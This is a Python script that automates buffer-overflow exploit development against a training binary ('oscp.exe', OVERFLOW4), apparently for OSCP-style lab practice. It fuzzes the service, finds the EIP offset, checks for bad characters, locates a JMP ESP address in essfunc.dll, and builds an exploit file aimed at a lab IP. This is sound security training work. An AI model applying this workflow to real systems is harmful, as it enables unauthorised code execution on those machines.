import threading
from radare import Program
from find_badchars import FindBadchars
from helpers import pattern_gen, pattern_search, return_pretty_hex

#TODO: Add argument parser here for local ip, port, exepath etc..

program = Program("example_exes\\oscp.exe", ["-d", "-2"], "192.168.1.21", 1337) #Your ip and port
OVERFLOW = 'OVERFLOW4 '
threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.fuzz(OVERFLOW, "\x41", 100)).start()

if not program.detect_bof(0x41414141):
    print("[ - ] BOF is not successfuly used.")
    exit(1)
program.restart()

pattern = pattern_gen(program.crashed_counter)

threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.exploit(OVERFLOW, pattern, "", "", b'', "")).start()

current_eip = program.get_register_value_as_string("eip")

offset = pattern_search(current_eip)
new_eip = 4*"B"

program.restart()

threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.exploit(OVERFLOW, "\x41"*offset, new_eip, 16*"\x90", b'', "")).start()

current_eip = program.get_register_value("eip")

if not program.successfuly_overwrited(0x42424242):
    print("[ - ] BOF is not successfuly overwritten with BBBB.")
    exit(1)

find_bad_chars = FindBadchars(OVERFLOW, offset, new_eip, program, "192.168.1.21", 1337)
bad_chars = find_bad_chars.find_badchars()


int_badchars = []
str_badchars = ""
for char in bad_chars:
    int_badchars.append(ord(char))
    str_badchars+=char

print("[ * ] All badchars are found!:\t", return_pretty_hex(str_badchars))

esp = program.get_jmp_esp_addr("example_exes\\essfunc.dll",int_badchars)

program.create_file(OVERFLOW, "\x41"*offset, esp, "", "", "", str_badchars ,_ip = "10.10.209.168") #ip of machine
